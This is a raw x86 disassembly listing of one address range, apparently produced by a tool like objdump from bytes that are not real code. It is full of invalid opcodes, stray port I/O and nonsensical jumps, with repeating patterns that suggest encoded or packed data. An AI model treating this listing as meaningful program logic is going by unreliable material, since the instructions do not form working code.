  40542c:	e0 a0                	loopne 0x4053ce
  40542e:	a0 c4 9f 90 04       	mov    0x4909fc4,%al
  405433:	e9 c0 eb 63 48       	jmp    0x48a43ff8
  405438:	dd 45 9f             	fldl   -0x61(%ebp)
  40543b:	5f                   	pop    %edi
  40543c:	d3 20                	shll   %cl,(%eax)
  40543e:	f5                   	cmc
  40543f:	c8 b4 a0 e0          	enter  $0xa0b4,$0xe0
  405443:	60                   	pusha
  405444:	04 5f                	add    $0x5f,%al
  405446:	d0 c4                	rol    $1,%ah
  405448:	29 80 88 b2 75 5f    	sub    %eax,0x5f75b288(%eax)
  40544e:	9f                   	lahf
  40544f:	ed                   	in     (%dx),%eax
  405450:	e5 5c                	in     $0x5c,%eax
  405452:	5a                   	pop    %edx
  405453:	b0 e0                	mov    $0xe0,%al
  405455:	a0 a0 48 55 45       	mov    0x455548a0,%al
  40545a:	9f                   	lahf
  40545b:	5f                   	pop    %edi
  40545c:	2b 23                	sub    (%ebx),%esp
  40545e:	88 76 85             	mov    %dh,-0x7b(%esi)
  405461:	5f                   	pop    %edi
  405462:	9f                   	lahf
  405463:	eb e5                	jmp    0x40544a
  405465:	5c                   	pop    %esp
  405466:	88 ee                	mov    %ch,%dh
  405468:	86 5f 9f             	xchg   %bl,-0x61(%edi)
  40546b:	48                   	dec    %eax
  40546c:	d5 3a                	aad    $0x3a
  40546e:	9f                   	lahf
  40546f:	5f                   	pop    %edi
  405470:	2b b5 9c ea b4 62    	sub    0x62b4ea9c(%ebp),%esi
  405476:	2d a5 98 48 b7       	sub    $0xb74898a5,%eax
  40547b:	46                   	inc    %esi
  40547c:	9f                   	lahf
  40547d:	5f                   	pop    %edi
  40547e:	2b b5 98 eb 63 48    	sub    0x4863eb98(%ebp),%esi
  405484:	19 46 9f             	sbb    %eax,-0x61(%esi)
  405487:	5f                   	pop    %edi
  405488:	2b 63 88             	sub    -0x78(%ebx),%esp
  40548b:	ca 86 5f             	lret   $0x5f86
  40548e:	9f                   	lahf
  40548f:	9b                   	fwait
  405490:	90                   	nop
  405491:	d5 70                	aad    $0x70
  405493:	93                   	xchg   %eax,%ebx
  405494:	60                   	pusha
  405495:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  40549a:	b0 4b                	mov    $0x4b,%al
  40549c:	aa                   	stos   %al,%es:(%edi)
  40549d:	49                   	dec    %ecx
  40549e:	8f                   	(bad)
  40549f:	3e 9f                	ds lahf
  4054a1:	5f                   	pop    %edi
  4054a2:	88 02                	mov    %al,(%edx)
  4054a4:	80 5f 9f 93          	sbbb   $0x93,-0x61(%edi)
  4054a8:	60                   	pusha
  4054a9:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4054ae:	b0 c8                	mov    $0xc8,%al
  4054b0:	e0 a0                	loopne 0x405452
  4054b2:	e0 60                	loopne 0x405514
  4054b4:	2d a5 98 1a a2       	sub    $0xa21a98a5,%eax
  4054b9:	60                   	pusha
  4054ba:	a0 60 88 3c 84       	mov    0x843c8860,%al
  4054bf:	5f                   	pop    %edi
  4054c0:	9f                   	lahf
  4054c1:	23 89 56 7f 5f 9f    	and    -0x60a080aa(%ecx),%ecx
  4054c7:	4b                   	dec    %ebx
  4054c8:	8b bf fe bb f9 b9    	mov    -0x46064402(%edi),%edi
  4054ce:	fd                   	std
  4054cf:	23 a0 5f 9f 5f 9f    	and    -0x60a060a1(%eax),%esp
  4054d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4054d6:	a0 60 a0 c1 02       	mov    0x2c1a060,%al
  4054db:	c3                   	ret
  4054dc:	04 c5                	add    $0xc5,%al
  4054de:	08 cd                	or     %cl,%ch
  4054e0:	0e                   	push   %cs
  4054e1:	cf                   	iret
  4054e2:	10 d2                	adc    %dl,%dl
  4054e4:	13 d5                	adc    %ebp,%edx
  4054e6:	16                   	push   %ss
  4054e7:	d8 a0 b5 2b 4c d3    	fsubs  -0x2cb3d44b(%eax)
  4054ed:	20 f5                	and    %dh,%ch
  4054ef:	c8 25 a0 e0          	enter  $0xa025,$0xe0
  4054f3:	60                   	pusha
  4054f4:	04 5f                	add    $0x5f,%al
  4054f6:	d0 c4                	rol    $1,%ah
  4054f8:	29 80 9f 65 2c 16    	sub    %eax,0x162c659f(%eax)
  4054fe:	e0 60                	loopne 0x405560
  405500:	d3 20                	shll   %cl,(%eax)
  405502:	fa                   	cli
  405503:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405508:	08 ec                	or     %ch,%ah
  40550a:	e0 a0                	loopne 0x4054ac
  40550c:	a0 23 89 0a 7f       	mov    0x7f0a8923,%al
  405511:	5f                   	pop    %edi
  405512:	9f                   	lahf
  405513:	4b                   	dec    %ebx
  405514:	98                   	cwtl
  405515:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  40551a:	cd ec                	int    $0xec
  40551c:	56                   	push   %esi
  40551d:	a0 a0 61 63 b5       	mov    0xb56361a0,%al
  405522:	2b 4c 23 24          	sub    0x24(%ebx,%eiz,1),%ecx
  405526:	84 b3 f6 b7 2b 52    	test   %dh,0x522bb7f6(%ebx)
  40552c:	2b 38                	sub    (%eax),%edi
  40552e:	d3 20                	shll   %cl,(%eax)
  405530:	f5                   	cmc
  405531:	c8 74 a2 e0          	enter  $0xa274,$0xe0
  405535:	60                   	pusha
  405536:	04 5f                	add    $0x5f,%al
  405538:	d0 c4                	rol    $1,%ah
  40553a:	29 80 d3 20 29 a5    	sub    %eax,-0x5ad6df2d(%eax)
  405540:	9c                   	pushf
  405541:	eb 63                	jmp    0x4055a6
  405543:	48                   	dec    %eax
  405544:	51                   	push   %ecx
  405545:	45                   	inc    %ebp
  405546:	9f                   	lahf
  405547:	5f                   	pop    %edi
  405548:	f0 eb 63             	lock jmp 0x4055ae
  40554b:	48                   	dec    %eax
  40554c:	41                   	inc    %ecx
  40554d:	47                   	inc    %edi
  40554e:	9f                   	lahf
  40554f:	5f                   	pop    %edi
  405550:	2d b5 9c b9 88       	sub    $0x88b99cb5,%eax
  405555:	9c                   	pushf
  405556:	72 5f                	jb     0x4055b7
  405558:	9f                   	lahf
  405559:	eb 63                	jmp    0x4055be
  40555b:	48                   	dec    %eax
  40555c:	39 45 9f             	cmp    %eax,-0x61(%ebp)
  40555f:	5f                   	pop    %edi
  405560:	e8 d4 af a8 14       	call   0x14e90539
  405565:	d4 e8                	aam    $0xe8
  405567:	6f                   	outsl  %ds:(%esi),(%dx)
  405568:	24 6f                	and    $0x6f,%al
  40556a:	a1 60 a0 49 81       	mov    0x8149a060,%eax
  40556f:	61                   	popa
  405570:	a0 60 2d a5 98       	mov    0x98a52d60,%al
  405575:	eb f5                	jmp    0x40556c
  405577:	5c                   	pop    %esp
  405578:	21 42 df             	and    %eax,-0x21(%edx)
  40557b:	60                   	pusha
  40557c:	a0 e0 19 65 ea       	mov    0xea6519e0,%al
  405581:	e3 6a                	jecxz  0x4055ed
  405583:	20 e2                	and    %ah,%dl
  405585:	ea 32 28 40 a0 a0 e8 	ljmp   $0xe8a0,$0xa0402832
  40558c:	f0 61                	lock popa
  40558e:	66 60                	pushaw
  405590:	a1 ed f5 58 2d       	mov    0x2d58f5ed,%eax
  405595:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405596:	94                   	xchg   %eax,%esp
  405597:	48                   	dec    %eax
  405598:	31 38                	xor    %edi,(%eax)
  40559a:	9f                   	lahf
  40559b:	5f                   	pop    %edi
  40559c:	2d a5 90 eb f5       	sub    $0xf5eb90a5,%eax
  4055a1:	5c                   	pop    %esp
  4055a2:	61                   	popa
  4055a3:	4a                   	dec    %edx
  4055a4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4055a5:	e1 82                	loope  0x405529
  4055a7:	9f                   	lahf
  4055a8:	a0 60 20 d9 a5       	mov    0xa5d92060,%al
  4055ad:	aa                   	stos   %al,%es:(%edi)
  4055ae:	23 2a                	and    (%edx),%ebp
  4055b0:	60                   	pusha
  4055b1:	a2 2a f2 68 00       	mov    %al,0x68f22a
  4055b6:	e0 60                	loopne 0x405618
  4055b8:	28 b0 a1 26 a0 61    	sub    %dh,0x61a026a1(%eax)
  4055be:	2d b5 90 ed e5       	sub    $0xe5ed90b5,%eax
  4055c3:	54                   	push   %esp
  4055c4:	51                   	push   %ecx
  4055c5:	62 88 92 78 5f 9f    	bound  %ecx,-0x60a0876e(%eax)
  4055cb:	ed                   	in     (%dx),%eax
  4055cc:	f5                   	cmc
  4055cd:	54                   	push   %esp
  4055ce:	2b 26                	sub    (%esi),%esp
  4055d0:	88 60 85             	mov    %ah,-0x7b(%eax)
  4055d3:	5f                   	pop    %edi
  4055d4:	9f                   	lahf
  4055d5:	49                   	dec    %ecx
  4055d6:	19 61 a0             	sbb    %esp,-0x60(%ecx)
  4055d9:	60                   	pusha
  4055da:	2d a5 98 eb f5       	sub    $0xf5eb98a5,%eax
  4055df:	5c                   	pop    %esp
  4055e0:	21 42 df             	and    %eax,-0x21(%edx)
  4055e3:	60                   	pusha
  4055e4:	a0 e0 19 65 ea       	mov    0xea6519e0,%al
  4055e9:	e3 6a                	jecxz  0x405655
  4055eb:	20 e2                	and    %ah,%dl
  4055ed:	ea 32 28 40 a0 a0 e8 	ljmp   $0xe8a0,$0xa0402832
  4055f4:	f0 61                	lock popa
  4055f6:	66 60                	pushaw
  4055f8:	a1 ed f5 58 2d       	mov    0x2d58f5ed,%eax
  4055fd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4055fe:	94                   	xchg   %eax,%esp
  4055ff:	48                   	dec    %eax
  405600:	c9                   	leave
  405601:	38 9f 5f 2d a5 90    	cmp    %bl,-0x6f5ad2a1(%edi)
  405607:	eb f5                	jmp    0x4055fe
  405609:	5c                   	pop    %esp
  40560a:	61                   	popa
  40560b:	4a                   	dec    %edx
  40560c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40560d:	e1 82                	loope  0x405591
  40560f:	9f                   	lahf
  405610:	a0 60 20 d9 a5       	mov    0xa5d92060,%al
  405615:	aa                   	stos   %al,%es:(%edi)
  405616:	23 2a                	and    (%edx),%ebp
  405618:	60                   	pusha
  405619:	a2 2a f2 68 00       	mov    %al,0x68f22a
  40561e:	e0 60                	loopne 0x405680
  405620:	28 b0 a1 26 a0 61    	sub    %dh,0x61a026a1(%eax)
  405626:	2d b5 90 ed e5       	sub    $0xe5ed90b5,%eax
  40562b:	54                   	push   %esp
  40562c:	51                   	push   %ecx
  40562d:	62 88 2a 77 5f 9f    	bound  %ecx,-0x60a088d6(%eax)
  405633:	ed                   	in     (%dx),%eax
  405634:	f5                   	cmc
  405635:	54                   	push   %esp
  405636:	2d a5 8c 48 8f       	sub    $0x8f488ca5,%eax
  40563b:	37                   	aaa
  40563c:	9f                   	lahf
  40563d:	5f                   	pop    %edi
  40563e:	2d a5 90 eb f5       	sub    $0xf5eb90a5,%eax
  405643:	5c                   	pop    %esp
  405644:	61                   	popa
  405645:	4a                   	dec    %edx
  405646:	ac                   	lods   %ds:(%esi),%al
  405647:	e1 82                	loope  0x4055cb
  405649:	9f                   	lahf
  40564a:	a0 60 20 d9 a5       	mov    0xa5d92060,%al
  40564f:	aa                   	stos   %al,%es:(%edi)
  405650:	23 2a                	and    (%edx),%ebp
  405652:	60                   	pusha
  405653:	a2 2a f2 68 00       	mov    %al,0x68f22a
  405658:	e0 60                	loopne 0x4056ba
  40565a:	28 b0 a1 26 a0 61    	sub    %dh,0x61a026a1(%eax)
  405660:	2d b5 90 ed e5       	sub    $0xe5ed90b5,%eax
  405665:	4c                   	dec    %esp
  405666:	51                   	push   %ecx
  405667:	63 88 f0 77 5f 9f    	arpl   %ecx,-0x60a08810(%eax)
  40566d:	ed                   	in     (%dx),%eax
  40566e:	f5                   	cmc
  40566f:	4c                   	dec    %esp
  405670:	2b 26                	sub    (%esi),%esp
  405672:	88 be 84 5f 9f 49    	mov    %bh,0x499f5f84(%esi)
  405678:	77 60                	ja     0x4056da
  40567a:	a0 60 2d a5 98       	mov    0x98a52d60,%al
  40567f:	eb f5                	jmp    0x405676
  405681:	5c                   	pop    %esp
  405682:	21 42 df             	and    %eax,-0x21(%edx)
  405685:	60                   	pusha
  405686:	a0 e0 19 65 ea       	mov    0xea6519e0,%al
  40568b:	e3 6a                	jecxz  0x4056f7
  40568d:	20 e2                	and    %ah,%dl
  40568f:	ea 32 28 40 a0 a0 e8 	ljmp   $0xe8a0,$0xa0402832
  405696:	f0 61                	lock popa
  405698:	66 60                	pushaw
  40569a:	a1 ed f5 58 2d       	mov    0x2d58f5ed,%eax
  40569f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4056a0:	94                   	xchg   %eax,%esp
  4056a1:	48                   	dec    %eax
  4056a2:	27                   	daa
  4056a3:	37                   	aaa
  4056a4:	9f                   	lahf
  4056a5:	5f                   	pop    %edi
  4056a6:	2d a5 90 eb f5       	sub    $0xf5eb90a5,%eax
  4056ab:	5c                   	pop    %esp
  4056ac:	61                   	popa
  4056ad:	4a                   	dec    %edx
  4056ae:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4056af:	e1 82                	loope  0x405633
  4056b1:	9f                   	lahf
  4056b2:	a0 60 20 d9 a5       	mov    0xa5d92060,%al
  4056b7:	aa                   	stos   %al,%es:(%edi)
  4056b8:	23 2a                	and    (%edx),%ebp
  4056ba:	60                   	pusha
  4056bb:	a2 2a f2 68 00       	mov    %al,0x68f22a
  4056c0:	e0 60                	loopne 0x405722
  4056c2:	28 b0 a1 26 a0 61    	sub    %dh,0x61a026a1(%eax)
  4056c8:	2d b5 90 ed e5       	sub    $0xe5ed90b5,%eax
  4056cd:	54                   	push   %esp
  4056ce:	51                   	push   %ecx
  4056cf:	62 88 88 77 5f 9f    	bound  %ecx,-0x60a08878(%eax)
  4056d5:	ed                   	in     (%dx),%eax
  4056d6:	f5                   	cmc
  4056d7:	54                   	push   %esp
  4056d8:	2d a5 8c 48 ed       	sub    $0xed488ca5,%eax
  4056dd:	37                   	aaa
  4056de:	9f                   	lahf
  4056df:	5f                   	pop    %edi
  4056e0:	2d a5 90 eb f5       	sub    $0xf5eb90a5,%eax
  4056e5:	5c                   	pop    %esp
  4056e6:	61                   	popa
  4056e7:	4a                   	dec    %edx
  4056e8:	ac                   	lods   %ds:(%esi),%al
  4056e9:	e1 82                	loope  0x40566d
  4056eb:	9f                   	lahf
  4056ec:	a0 60 20 d9 a5       	mov    0xa5d92060,%al
  4056f1:	aa                   	stos   %al,%es:(%edi)
  4056f2:	23 2a                	and    (%edx),%ebp
  4056f4:	60                   	pusha
  4056f5:	a2 2a f2 68 00       	mov    %al,0x68f22a
  4056fa:	e0 60                	loopne 0x40575c
  4056fc:	28 b0 a1 26 a0 61    	sub    %dh,0x61a026a1(%eax)
  405702:	2d b5 90 ed e5       	sub    $0xe5ed90b5,%eax
  405707:	4c                   	dec    %esp
  405708:	51                   	push   %ecx
  405709:	63 88 4e 76 5f 9f    	arpl   %ecx,-0x60a089b2(%eax)
  40570f:	ed                   	in     (%dx),%eax
  405710:	f5                   	cmc
  405711:	4c                   	dec    %esp
  405712:	2d a5 84 48 b3       	sub    $0xb34884a5,%eax
  405717:	37                   	aaa
  405718:	9f                   	lahf
  405719:	5f                   	pop    %edi
  40571a:	2d a5 90 eb f5       	sub    $0xf5eb90a5,%eax
  40571f:	5c                   	pop    %esp
  405720:	61                   	popa
  405721:	4a                   	dec    %edx
  405722:	b2 e1                	mov    $0xe1,%dl
  405724:	82 9f a0 60 20 d9 a5 	sbbb   $0xa5,-0x26df9f60(%edi)
  40572b:	aa                   	stos   %al,%es:(%edi)
  40572c:	23 2a                	and    (%edx),%ebp
  40572e:	60                   	pusha
  40572f:	a2 2a f2 68 00       	mov    %al,0x68f22a
  405734:	e0 60                	loopne 0x405796
  405736:	28 b0 a1 26 a0 61    	sub    %dh,0x61a026a1(%eax)
  40573c:	2d b5 90 ed e5       	sub    $0xe5ed90b5,%eax
  405741:	44                   	inc    %esp
  405742:	51                   	push   %ecx
  405743:	64 88 14 76          	mov    %dl,%fs:(%esi,%esi,2)
  405747:	5f                   	pop    %edi
  405748:	9f                   	lahf
  405749:	ed                   	in     (%dx),%eax
  40574a:	f5                   	cmc
  40574b:	44                   	inc    %esp
  40574c:	2b 26                	sub    (%esi),%esp
  40574e:	88 e2                	mov    %ah,%dl
  405750:	83 5f 9f 93          	sbbl   $0xffffff93,-0x61(%edi)
  405754:	60                   	pusha
  405755:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  40575a:	b0 4b                	mov    $0x4b,%al
  40575c:	aa                   	stos   %al,%es:(%edi)
  40575d:	49                   	dec    %ecx
  40575e:	cf                   	iret
  40575f:	3c 9f                	cmp    $0x9f,%al
  405761:	5f                   	pop    %edi
  405762:	88 42 7d             	mov    %al,0x7d(%edx)
  405765:	5f                   	pop    %edi
  405766:	9f                   	lahf
  405767:	bf fe bb 2b 45       	mov    $0x452bbbfe,%edi
  40576c:	fd                   	std
  40576d:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  405773:	4c                   	dec    %esp
  405774:	f1                   	int1
  405775:	b3 f6                	mov    $0xf6,%bl
  405777:	b7 2b                	mov    $0x2b,%bh
  405779:	52                   	push   %edx
  40577a:	2b 38                	sub    (%eax),%edi
  40577c:	d3 20                	shll   %cl,(%eax)
  40577e:	f5                   	cmc
  40577f:	c8 cf a4 e0          	enter  $0xa4cf,$0xe0
  405783:	60                   	pusha
  405784:	04 5f                	add    $0x5f,%al
  405786:	d0 c4                	rol    $1,%ah
  405788:	29 80 2b 23 88 c8    	sub    %eax,-0x3777dcd5(%eax)
  40578e:	83 5f 9f e3          	sbbl   $0xffffffe3,-0x61(%edi)
  405792:	88 62 14             	mov    %ah,0x14(%edx)
  405795:	6f                   	outsl  %ds:(%esi),(%dx)
  405796:	e8 d4 f6 a8 af       	call   0xafe94e6f
  40579b:	e4 47                	in     $0x47,%al
  40579d:	60                   	pusha
  40579e:	a0 60 89 69 a1       	mov    0xa1698960,%al
  4057a3:	60                   	pusha
  4057a4:	a0 93 60 ea a3       	mov    0xa3ea6093,%al
  4057a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4057aa:	56                   	push   %esi
  4057ab:	e0 a8                	loopne 0x405755
  4057ad:	01 e0                	add    %esp,%eax
  4057af:	60                   	pusha
  4057b0:	d3 32                	shll   %cl,(%edx)
  4057b2:	2a b3 a1 6f 56 f2    	sub    -0xda9905f(%ebx),%dh
  4057b8:	a8 01                	test   $0x1,%al
  4057ba:	e0 60                	loopne 0x40581c
  4057bc:	61                   	popa
  4057bd:	42                   	inc    %edx
  4057be:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4057bf:	63 62 e9             	arpl   %esp,-0x17(%edx)
  4057c2:	e5 5c                	in     $0x5c,%eax
  4057c4:	2b 26                	sub    (%esi),%esp
  4057c6:	5a                   	pop    %edx
  4057c7:	61                   	popa
  4057c8:	a0 60 a0 48 ed       	mov    0xed48a060,%al
  4057cd:	46                   	inc    %esi
  4057ce:	9f                   	lahf
  4057cf:	5f                   	pop    %edi
  4057d0:	2b 66 88             	sub    -0x78(%esi),%esp
  4057d3:	82 83 5f 9f b0 2b 26 	addb   $0x26,0x2bb09f5f(%ebx)
  4057da:	88 c6                	mov    %al,%dh
  4057dc:	85 5f 9f             	test   %ebx,-0x61(%edi)
  4057df:	eb 70                	jmp    0x405851
  4057e1:	ed                   	in     (%dx),%eax
  4057e2:	e5 5c                	in     $0x5c,%eax
  4057e4:	f9                   	stc
  4057e5:	48                   	dec    %eax
  4057e6:	4b                   	dec    %ebx
  4057e7:	2f                   	das
  4057e8:	9f                   	lahf
  4057e9:	5f                   	pop    %edi
  4057ea:	89 1f                	mov    %ebx,(%edi)
  4057ec:	a0 60 a0 93 60       	mov    0x6093a060,%al
  4057f1:	ea a3 6f 56 e0 a8 01 	ljmp   $0x1a8,$0xe0566fa3
  4057f8:	e0 60                	loopne 0x40585a
  4057fa:	d3 32                	shll   %cl,(%edx)
  4057fc:	2a b3 a1 6f 56 f2    	sub    -0xda9905f(%ebx),%dh
  405802:	a8 01                	test   $0x1,%al
  405804:	e0 60                	loopne 0x405866
  405806:	61                   	popa
  405807:	42                   	inc    %edx
  405808:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405809:	63 62 93             	arpl   %esp,-0x6d(%edx)
  40580c:	72 ea                	jb     0x4057f8
  40580e:	f3 62 af 16 32 68 41 	repz bound %ebp,0x41683216(%edi)
  405815:	a0 a0 21 82 6c       	mov    0x6c8221a0,%al
  40581a:	a3 22 29 a5 9c       	mov    %eax,0x9ca52922
  40581f:	eb 66                	jmp    0x405887
  405821:	1a a2 60 a0 60 88    	sbb    -0x779f5fa0(%edx),%ah
  405827:	52                   	push   %edx
  405828:	85 5f 9f             	test   %ebx,-0x61(%edi)
  40582b:	eb a6                	jmp    0x4057d3
  40582d:	48                   	dec    %eax
  40582e:	67 42                	addr16 inc %edx
  405830:	9f                   	lahf
  405831:	5f                   	pop    %edi
  405832:	f0 eb 66             	lock jmp 0x40589b
  405835:	48                   	dec    %eax
  405836:	ab                   	stos   %eax,%es:(%edi)
  405837:	45                   	inc    %ebp
  405838:	9f                   	lahf
  405839:	5f                   	pop    %edi
  40583a:	2b 30                	sub    (%eax),%esi
  40583c:	2d a5 9c b9 88       	sub    $0x88b99ca5,%eax
  405841:	b0 6f                	mov    $0x6f,%al
  405843:	5f                   	pop    %edi
  405844:	9f                   	lahf
  405845:	4b                   	dec    %ebx
  405846:	07                   	pop    %es
  405847:	93                   	xchg   %eax,%ebx
  405848:	60                   	pusha
  405849:	ea a3 6f 56 e0 a8 01 	ljmp   $0x1a8,$0xe0566fa3
  405850:	e0 60                	loopne 0x4058b2
  405852:	d3 32                	shll   %cl,(%edx)
  405854:	2a b3 a1 6f 56 f2    	sub    -0xda9905f(%ebx),%dh
  40585a:	a8 01                	test   $0x1,%al
  40585c:	e0 60                	loopne 0x4058be
  40585e:	61                   	popa
  40585f:	42                   	inc    %edx
  405860:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405861:	63 62 93             	arpl   %esp,-0x6d(%edx)
  405864:	72 ea                	jb     0x405850
  405866:	f3 62 af 16 32 68 41 	repz bound %ebp,0x41683216(%edi)
  40586d:	a0 a0 21 82 6c       	mov    0x6c8221a0,%al
  405872:	a3 22 d3 32 2a       	mov    %eax,0x2a32d322
  405877:	b3 a3                	mov    $0xa3,%bl
  405879:	6f                   	outsl  %ds:(%esi),(%dx)
  40587a:	56                   	push   %esi
  40587b:	f2 a8 01             	repnz test $0x1,%al
  40587e:	e0 60                	loopne 0x4058e0
  405880:	61                   	popa
  405881:	42                   	inc    %edx
  405882:	b2 63                	mov    $0x63,%dl
  405884:	62 e9 e5             	(bad) {ru-bad},{%k4}
  405887:	5c                   	pop    %esp
  405888:	2b 26                	sub    (%esi),%esp
  40588a:	5a                   	pop    %edx
  40588b:	63 a0 60 a0 48 29    	arpl   %esp,0x2948a060(%eax)
  405891:	45                   	inc    %ebp
  405892:	9f                   	lahf
  405893:	5f                   	pop    %edi
  405894:	2b 66 88             	sub    -0x78(%esi),%esp
  405897:	be 82 5f 9f b0       	mov    $0xb09f5f82,%esi
  40589c:	2b 26                	sub    (%esi),%esp
  40589e:	88 02                	mov    %al,(%edx)
  4058a0:	84 5f 9f             	test   %bl,-0x61(%edi)
  4058a3:	eb 70                	jmp    0x405915
  4058a5:	ed                   	in     (%dx),%eax
  4058a6:	e5 5c                	in     $0x5c,%eax
  4058a8:	f9                   	stc
  4058a9:	48                   	dec    %eax
  4058aa:	87 2e                	xchg   %ebp,(%esi)
  4058ac:	9f                   	lahf
  4058ad:	5f                   	pop    %edi
  4058ae:	d3 20                	shll   %cl,(%eax)
  4058b0:	fa                   	cli
  4058b1:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4058b6:	8b 6a 89             	mov    -0x77(%edx),%ebp
  4058b9:	34 7a                	xor    $0x7a,%al
  4058bb:	5f                   	pop    %edi
  4058bc:	9f                   	lahf
  4058bd:	48                   	dec    %eax
  4058be:	27                   	daa
  4058bf:	3c 9f                	cmp    $0x9f,%al
  4058c1:	5f                   	pop    %edi
  4058c2:	ff                   	(bad)
  4058c3:	be fb b9 fd 23       	mov    $0x23fdb9fb,%esi
  4058c8:	30 b5 2b 4c 0a 60    	xor    %dh,0x600a4c2b(%ebp)
  4058ce:	0a 60 0a             	or     0xa(%eax),%ah
  4058d1:	60                   	pusha
  4058d2:	f3 b6 2b             	repz mov $0x2b,%dh
  4058d5:	3a 2b                	cmp    (%ebx),%ch
  4058d7:	50                   	push   %eax
  4058d8:	d3 20                	shll   %cl,(%eax)
  4058da:	f5                   	cmc
  4058db:	c8 6e a4 e0          	enter  $0xa46e,$0xe0
  4058df:	60                   	pusha
  4058e0:	04 5f                	add    $0x5f,%al
  4058e2:	d0 c4                	rol    $1,%ah
  4058e4:	29 80 2d a5 9c eb    	sub    %eax,-0x14635ad3(%eax)
  4058ea:	76 48                	jbe    0x405934
  4058ec:	c1 41 9f 5f          	roll   $0x5f,-0x61(%ecx)
  4058f0:	2b 23                	sub    (%ebx),%esp
  4058f2:	88 e2                	mov    %ah,%dl
  4058f4:	80 5f 9f 4b          	sbbb   $0x4b,-0x61(%edi)
  4058f8:	dd ed                	fucomp %st(5)
  4058fa:	e5 54                	in     $0x54,%eax
  4058fc:	f0 19 a4 60 a0 60 5a 	lock sbb %esp,0x615a60a0(%eax,%eiz,2)
  405903:	61 
  405904:	a0 60 a0 eb e5       	mov    0xe5eba060,%al
  405909:	5c                   	pop    %esp
  40590a:	88 9e 84 5f 9f eb    	mov    %bl,-0x1460a07c(%esi)
  405910:	e5 54                	in     $0x54,%eax
  405912:	2d b5 98 48 f7       	sub    $0xf74898b5,%eax
  405917:	5e                   	pop    %esi
  405918:	9f                   	lahf
  405919:	5f                   	pop    %edi
  40591a:	2b b5 98 eb 63 48    	sub    0x4863eb98(%ebp),%esi
  405920:	7d 41                	jge    0x405963
  405922:	9f                   	lahf
  405923:	5f                   	pop    %edi
  405924:	2d a5 9c 19 a4       	sub    $0xa4199ca5,%eax
  405929:	60                   	pusha
  40592a:	a0 60 5a 61 a0       	mov    0xa0615a60,%al
  40592f:	60                   	pusha
  405930:	a0 48 f7 44 9f       	mov    0x9f44f748,%al
  405935:	5f                   	pop    %edi
  405936:	23 dd                	and    %ebp,%ebx
  405938:	9c                   	pushf
  405939:	60                   	pusha
  40593a:	15 1d d3 20 fa       	adc    $0xfa20d31d,%eax
  40593f:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405944:	08 35 e4 a0 a0 ed    	or     %dh,0xeda0a0e4
  40594a:	e5 54                	in     $0x54,%eax
  40594c:	5a                   	pop    %edx
  40594d:	63 a0 60 a0 48 e7    	arpl   %esp,-0x18b75fa0(%eax)
  405953:	40                   	inc    %eax
  405954:	9f                   	lahf
  405955:	5f                   	pop    %edi
  405956:	63 49 01             	arpl   %ecx,0x1(%ecx)
  405959:	3b 9f 5f 8b 4b fe    	cmp    -0x1b474a1(%edi),%ebx
  40595f:	bb 2b 45 fd 23       	mov    $0x23fd452b,%ebx
  405964:	30 b5 2b 4c 0a 60    	xor    %dh,0x600a4c2b(%ebp)
  40596a:	0a 60 0a             	or     0xa(%eax),%ah
  40596d:	60                   	pusha
  40596e:	f3 b6 f7             	repz mov $0xf7,%dh
  405971:	eb 7a                	jmp    0x4059ed
  405973:	eb 90                	jmp    0x405905
  405975:	93                   	xchg   %eax,%ebx
  405976:	60                   	pusha
  405977:	b5 08                	mov    $0x8,%ch
  405979:	ed                   	in     (%dx),%eax
  40597a:	e5 a0                	in     $0xa0,%eax
  40597c:	a0 c4 9f 90 04       	mov    0x4909fc4,%al
  405981:	e9 c0 93 60 b5       	jmp    0xb5a0ed46
  405986:	08 c8                	or     %cl,%al
  405988:	e5 a0                	in     $0xa0,%eax
  40598a:	a0 c4 9f 90 04       	mov    0x4909fc4,%al
  40598f:	e9 c0 ed e5 5c       	jmp    0x5d264754
  405994:	2b 36                	sub    (%esi),%esi
  405996:	88 d6                	mov    %dl,%dh
  405998:	80 5f 9f eb          	sbbb   $0xeb,-0x61(%edi)
  40599c:	63 48 77             	arpl   %ecx,0x77(%eax)
  40599f:	3f                   	aas
  4059a0:	9f                   	lahf
  4059a1:	5f                   	pop    %edi
  4059a2:	8b 9d 2d a5 94 b0    	mov    -0x4f6b5ad3(%ebp),%ebx
  4059a8:	59                   	pop    %ecx
  4059a9:	63 a0 60 a0 1a a1    	arpl   %esp,-0x5ee55fa0(%eax)
  4059af:	60                   	pusha
  4059b0:	a0 60 2b a5 9c       	mov    0x9ca52b60,%al
  4059b5:	48                   	dec    %eax
  4059b6:	33 43 9f             	xor    -0x61(%ebx),%eax
  4059b9:	5f                   	pop    %edi
  4059ba:	2b a5 94 ed f5 58    	sub    0x58f5ed94(%ebp),%esp
  4059c0:	88 bc 9b 5f 9f eb f5 	mov    %bh,-0xa1460a1(%ebx,%ebx,4)
  4059c7:	58                   	pop    %eax
  4059c8:	2b 23                	sub    (%ebx),%esp
  4059ca:	88 92 81 5f 9f ed    	mov    %dl,-0x1260a07f(%edx)
  4059d0:	e5 5c                	in     $0x5c,%eax
  4059d2:	59                   	pop    %ecx
  4059d3:	63 a0 60 a0 1a a1    	arpl   %esp,-0x5ee55fa0(%eax)
  4059d9:	60                   	pusha
  4059da:	a0 60 88 0c 83       	mov    0x830c8860,%al
  4059df:	5f                   	pop    %edi
  4059e0:	9f                   	lahf
  4059e1:	e3 1d                	jecxz  0x405a00
  4059e3:	5c                   	pop    %esp
